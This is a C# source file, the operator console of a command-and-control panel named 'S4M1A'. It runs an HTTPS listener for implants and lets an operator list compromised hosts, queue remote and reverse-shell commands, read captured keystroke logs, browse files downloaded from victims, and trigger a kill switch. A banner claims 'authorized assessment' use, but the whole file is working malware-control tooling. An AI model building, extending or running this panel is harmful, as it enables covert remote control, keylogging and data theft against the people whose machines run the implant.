using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Text;
using System.Threading;

namespace S4M1A.Panel
{
    // =====================================================================
    //  S4M1A Panel v2.0 - Panel.cs (entry point + operator console)
    //
    //  Build:
    //    csc /nologo /t:exe /out:Panel.exe /r:System.Web.Extensions.dll
    //        /r:System.Runtime.Serialization.dll Session.cs CommandHandler.cs
    //        C2Server.cs Panel.cs
    //
    //  Config file: panel_config.json (same folder). Generate template
    //  by running: Panel.exe gencfg
    //  {
    //    "port":443,            // implant HTTPS port
    //    "cert_hash":"",        // sslcert thumbprint (uppercase, no colons)
    //    "admin_port":8080,     // informational (console is the operator UI)
    //    "kill":"",             // kill-switch password (implant compares)
    //    "dead_hours":72,       // session timeout before purge
    //    "bearer":null,         // optional X-S4M1A-Token for implant endpoints
    //    "data_dir":"data"      // sessions.json / klogs / downloads
    //  }
    //
    //  Prereqs (one-time, admin):
    //    netsh http add urlacl url=https://+:443/ user=Everyone
    //    netsh http add sslcert ipport=0.0.0.0:443 certhash=<THUMB>
    //          appid={A73A5E4D-3B9F-4C21-9E6A-1F2C3D4E5F60}
    // =====================================================================

    public static class ConsoleUi
    {
        internal const string ConfigPath = "panel_config.json";
        private static PanelConfig _cfg;
        private static C2Server _server;
        private static int _lastSessionCount;
        private static volatile bool _running;

        // =================================================================
        //  Entry
        // =================================================================

        public static int Run(string[] args)
        {
            Console.Title = "S4M1A C2 Panel v2.0";
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("  ____  __  __  _  _  __  __  ___");
            Console.WriteLine(" / ___||  \\/  || || | \\ \\/ / / _ \\");
            Console.WriteLine(" \\___ \\| |\\/| || || |  \\  / | | | |");
            Console.WriteLine("  ___) | |  | || ||_| | /  \\ | |_| |");
            Console.WriteLine(" |____/|_|  |_| \\___/ /_/\\_\\ \\___/  v2.0");
            Console.ResetColor();
            Console.WriteLine("authorized assessment C2 - operator console\n");

            // ---------------- config ----------------
            if (args.Length > 0 && args[0].ToLowerInvariant() == "gencfg")
                return GenConfig();

            if (!TryLoadConfig(ConfigPath, out _cfg))
            {
                Console.WriteLine("[!] missing " + ConfigPath);
                Console.WriteLine("[!] run: Panel.exe gencfg  then edit the file, then start.");
                return 2;
            }
            PrintConfig(_cfg);

            // ---------------- init stores ----------------
            SessionStore.Init(_cfg.DataDir);
            CommandHandler.Init(_cfg);

            // ---------------- start HTTPS listener ----------------
            try
            {
                _server = new C2Server(_cfg);
                _server.Start();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] listener failed: " + ex.Message);
                Console.ResetColor();
                Console.WriteLine("    -> 1) run as Administrator");
                Console.WriteLine("    -> 2) netsh http add urlacl url=https://+:" +
                                  _cfg.Port + "/ user=Everyone");
                Console.WriteLine("    -> 3) netsh http add sslcert ipport=0.0.0.0:" +
                                  _cfg.Port + " certhash=" + _cfg.CertHash +
                                  " appid={A73A5E4D-3B9F-4C21-9E6A-1F2C3D4E5F60}");
                return 3;
            }

            _lastSessionCount = SessionStore.All().Count;
            _running = true;
            Thread t = new Thread(ActivityWatcher);
            t.IsBackground = true;
            t.Start();

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[*] HTTPS listener on https://+:" + _cfg.Port + "/");
            Console.WriteLine("[*] downloads -> " + Path.Combine(_cfg.DataDir, "downloads"));
            Console.WriteLine("[*] type 'help' for commands");
            Console.ResetColor();
            Console.WriteLine();

            ReplLoop();
            return 0;
        }

        // =================================================================
        //  Operator REPL
        // =================================================================

        private static void ReplLoop()
        {
            while (_running)
            {
                Console.Write("s4m1a> ");
                string line = Console.ReadLine();
                if (line == null) break;
                line = line.Trim();
                if (line.Length == 0) continue;

                string[] parts;
                if (line.StartsWith("cmd ") || line.StartsWith("shell "))
                {
                    // keep rest of line as args: [verb, sid, cmd, rest...]
                    parts = SplitCmd(line);
                }
                else
                {
                    parts = line.Split(new char[] { ' ' }, 2,
                                       StringSplitOptions.RemoveEmptyEntries);
                }

                string c = parts[0].ToLowerInvariant();

                try
                {
                    switch (c)
                    {
                        case "help":     Help(); break;
                        case "list":     case "sessions": ListSessions(); break;
                        case "info":     Info(Arg(parts, 1)); break;
                        case "cmd":      Cmd(parts); break;
                        case "shell":    Cmd(parts); break;
                        case "kill":     Kill(Arg(parts, 1)); break;
                        case "klog":     Klog(Arg(parts, 1)); break;
                        case "files":    Files(); break;
                        case "purge":    Purge(); break;
                        case "gencfg":   GenConfig(); break;
                        case "exit":     case "quit": case "q":
                            _running = false;
                            if (_server != null) _server.Stop();
                            SessionStore.Save();
                            Console.WriteLine("[*] bye");
                            break;
                        default:
                            Console.WriteLine("[!] unknown command (try 'help')");
                            break;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] error: " + ex.Message);
                }
            }
        }

        // =================================================================
        //  Command implementations
        // =================================================================

        private static void Help()
        {
            Console.WriteLine("  list                          - show all sessions");
            Console.WriteLine("  info <sid>                    - session details + results");
            Console.WriteLine("  cmd <sid> <cmd> [args]        - enqueue command");
            Console.WriteLine("  shell <sid> <cmdline>         - enqueue reverse shell cmd");
            Console.WriteLine("  kill <sid>                    - enqueue kill switch");
            Console.WriteLine("  klog <sid>                    - dump keystroke log");
            Console.WriteLine("  files                         - list downloaded files");
            Console.WriteLine("  purge                         - drop dead sessions");
            Console.WriteLine("  gencfg                        - write config template");
            Console.WriteLine("  exit / quit                   - stop server + save");
        }

        private static void ListSessions()
        {
            List<Session> all = SessionStore.All();
            if (all.Count == 0) { Console.WriteLine("[-] no sessions yet"); return; }

            Tuple<int, int> ad = CommandHandler.AliveDead(_cfg.DeadHours);
            Console.WriteLine("[+] " + ad.Item1 + " alive / " + ad.Item2 + " dead / " +
                              all.Count + " total\n");

            Console.WriteLine("SID                                 GROUP   HOST         USER          IP              ALIVE  QUEUE  LAST SEEN");
            foreach (Session s in all)
            {
                bool alive = s.IsAlive(_cfg.DeadHours);
                Console.WriteLine(
                    Pad(s.Sid, 36) + " " +
                    Pad(s.Group, 7) + " " +
                    Pad(s.Host, 12) + " " +
                    Pad(s.User, 13) + " " +
                    Pad(s.Ip, 15) + " " +
                    (alive ? "[+]" : "[x]") + " " +
                    Pad((s.Queue != null ? s.Queue.Count.ToString() : "0"), 5) + " " +
                    s.LastSeenUtc.ToString("yyyy-MM-dd HH:mm:ss"));
            }
        }

        private static void Info(string sid)
        {
            if (string.IsNullOrEmpty(sid)) { Console.WriteLine("[!] usage: info <sid>"); return; }
            Session s = SessionStore.Find(sid);
            if (s == null) { Console.WriteLine("[!] unknown session"); return; }

            Console.WriteLine("  sid       : " + s.Sid);
            Console.WriteLine("  implant   : " + s.ImplantId);
            Console.WriteLine("  group     : " + s.Group);
            Console.WriteLine("  host      : " + s.Host);
            Console.WriteLine("  user      : " + s.User);
            Console.WriteLine("  os        : " + s.Os + "  " + s.Arch);
            Console.WriteLine("  pid       : " + s.Pid + "  up: " + s.UptimeSec + "s");
            Console.WriteLine("  ip        : " + s.Ip);
            Console.WriteLine("  alias     : " + s.Alias);
            Console.WriteLine("  first seen: " + s.FirstSeenUtc.ToString("yyyy-MM-dd HH:mm:ss"));
            Console.WriteLine("  last seen : " + s.LastSeenUtc.ToString("yyyy-MM-dd HH:mm:ss"));
            Console.WriteLine("  alive     : " + s.IsAlive(_cfg.DeadHours));
            Console.WriteLine("  pending   : " + (s.Queue != null ? s.Queue.Count : 0));

            if (s.Results != null && s.Results.Count > 0)
            {
                Console.WriteLine("\n  recent results:");
                foreach (CmdResult r in s.Results.Skip(Math.Max(0, s.Results.Count - 20)))
                {
                    string tag = r.Ok ? "[ok ]" : "[err]";
                    string data = r.Data ?? "";
                    if (data.Length > 90) data = data.Substring(0, 90) + "...";
                    Console.WriteLine("    " + tag + " " + Pad(r.Cid, 16) + " " +
                                      r.ReceivedUtc.ToString("HH:mm:ss") + "  " + data);
                }
            }
        }

        private static void Cmd(string[] parts)
        {
            // parts: "cmd" <sid> <cmd> <args...>  OR  "shell" <sid> <args...>
            bool isShell = parts[0].ToLowerInvariant() == "shell";
            if (isShell && parts.Length < 3)
            { Console.WriteLine("[!] usage: shell <sid> <cmdline>"); return; }
            if (!isShell && parts.Length < 3)
            { Console.WriteLine("[!] usage: cmd <sid> <cmd> [args]"); return; }

            string sid = parts[1];
            Session s = SessionStore.Find(sid);
            if (s == null) { Console.WriteLine("[!] unknown session"); return; }

            string name, args;
            if (isShell)
            {
                name = "shell";
                args = string.Join(" ", parts.Skip(2));
            }
            else
            {
                name = parts[2];
                args = parts.Length >= 4 ? parts[3] : "";
            }

            string cid = CommandHandler.Enqueue(sid, name, args);
            Console.WriteLine("[+] queued " + name + " (" + cid + ") -> " + sid);
        }

        private static void Kill(string sid)
        {
            if (string.IsNullOrEmpty(sid)) { Console.WriteLine("[!] usage: kill <sid>"); return; }
            string cid = CommandHandler.EnqueueKill(sid);
            Console.WriteLine("[!] kill switch queued -> " + sid + " (" + cid + ")");
            Console.WriteLine("[!] implant will self-terminate + cleanup on next beacon");
        }

        private static void Klog(string sid)
        {
            if (string.IsNullOrEmpty(sid)) { Console.WriteLine("[!] usage: klog <sid>"); return; }
            string text = CommandHandler.GetKlog(sid);
            if (string.IsNullOrEmpty(text))
            {
                Console.WriteLine("[-] no keystrokes captured for " + sid);
                return;
            }
            Console.WriteLine("[+] klog (" + text.Length + " chars):\n");
            Console.WriteLine(text);
        }

        private static void Files()
        {
            string dir = Path.Combine(_cfg.DataDir, "downloads");
            if (!Directory.Exists(dir))
            { Console.WriteLine("[-] no downloads yet"); return; }

            var files = Directory.GetFiles(dir)
                .Where(f => !Path.GetFileName(f).EndsWith(".part"))
                .ToList();
            if (files.Count == 0) { Console.WriteLine("[-] no downloads yet"); return; }

            Console.WriteLine("[+] downloads (" + files.Count + "):");
            foreach (string f in files.OrderByDescending(x => new FileInfo(x).LastWriteTime))
            {
                FileInfo fi = new FileInfo(f);
                Console.WriteLine("    " + Pad(fi.Name, 40) + " " +
                                  Pad(FmtSize(fi.Length), 11) + " " +
                                  fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"));
            }
        }

        private static void Purge()
        {
            int before = SessionStore.All().Count;
            CommandHandler.PurgeDead(_cfg.DeadHours);
            int after = SessionStore.All().Count;
            Console.WriteLine("[+] purged " + (before - after) + " dead session(s)");
        }

        internal static int GenConfig()
        {
            if (File.Exists(ConfigPath))
            {
                Console.WriteLine("[!] " + ConfigPath + " already exists - leaving it");
                return 1;
            }
            PanelConfig t = new PanelConfig
            {
                Port = 443,
                CertHash = "REPLACE_WITH_SSL_THUMBPRINT",
                AdminPort = 8080,
                KillPassword = "s4m1a-kill",
                DeadHours = 72,
                Bearer = null,
                DataDir = "data"
            };
            WriteJson(ConfigPath, t);
            Console.WriteLine("[+] wrote " + ConfigPath);
            Console.WriteLine("[+] edit cert_hash (makecert thumbprint, uppercase)");
            Console.WriteLine("[+] set kill = password the implant compares");
            return 0;
        }

        // =================================================================
        //  Helpers
        // =================================================================

        // Long-running watcher: prints new sessions as they appear.
        private static void ActivityWatcher()
        {
            while (_running)
            {
                Thread.Sleep(5000);
                try
                {
                    int n = SessionStore.All().Count;
                    if (n > _lastSessionCount)
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("[+] new session registered (" +
                                          (n - _lastSessionCount) + " new, " + n + " total)");
                        Console.ResetColor();
                        _lastSessionCount = n;
                    }
                }
                catch { }
            }
        }

        internal static bool TryLoadConfig(string path, out PanelConfig cfg)
        {
            cfg = null;
            try
            {
                if (!File.Exists(path)) return false;
                using (FileStream fs = File.OpenRead(path))
                {
                    DataContractJsonSerializer ser =
                        new DataContractJsonSerializer(typeof(PanelConfig));
                    cfg = ser.ReadObject(fs) as PanelConfig;
                }
                if (cfg == null) return false;
                if (string.IsNullOrEmpty(cfg.DataDir)) cfg.DataDir = "data";
                return true;
            }
            catch { return false; }
        }

        private static void WriteJson(string path, object obj)
        {
            using (FileStream fs = File.Create(path))
            {
                DataContractJsonSerializer ser =
                    new DataContractJsonSerializer(obj.GetType());
                ser.WriteObject(fs, obj);
            }
        }

        internal static void PrintConfig(PanelConfig c)
        {
            Console.WriteLine("  config: implant port " + c.Port +
                              " | admin port " + c.AdminPort +
                              " | dead " + c.DeadHours + "h" +
                              " | bearer " + (string.IsNullOrEmpty(c.Bearer) ? "off" : "on"));
        }

        // Split "cmd <sid> <cmd> <rest...>" keeping the tail as one arg.
        private static string[] SplitCmd(string line)
        {
            string[] p = line.Split(new char[] { ' ' }, 4,
                                    StringSplitOptions.RemoveEmptyEntries);
            if (p.Length == 4)
                return new string[] { p[0], p[1], p[2], p[3] };
            return p;
        }

        private static string Arg(string[] parts, int idx)
        {
            return parts != null && parts.Length > idx ? parts[idx] : "";
        }

        private static string Pad(string s, int width)
        {
            if (s == null) s = "";
            if (s.Length > width) return s.Substring(0, width);
            return s.PadRight(width);
        }

        internal static string FmtSize(long bytes)
        {
            string[] u = { "B", "KB", "MB", "GB" };
            double v = bytes;
            int i = 0;
            while (v >= 1024 && i < u.Length - 1) { v /= 1024; i++; }
            return v.ToString("0.0") + u[i];
        }
    }
}